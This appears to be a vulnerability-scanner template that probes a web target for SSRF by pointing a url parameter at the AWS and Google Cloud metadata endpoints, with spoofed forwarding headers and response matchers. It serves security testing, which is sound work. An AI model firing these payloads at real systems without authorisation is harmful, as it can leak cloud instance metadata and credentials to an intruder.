id: K70n0s510-polyglot-metadata
info:
  name: Cloud Metadata SSRF (Polyglot & Bypass)
  author: K70n0s510
  severity: critical
http:
  - method: GET
    path:
      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}/?url=http://metadata.google.internal/computeMetadata/v1/project/project-id"
    headers:
      X-Forwarded-For: 127.0.0.1
      Metadata-Flavor: Google
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: word
        words: ["ami-id", "instance-id", "computeMetadata", "google"]
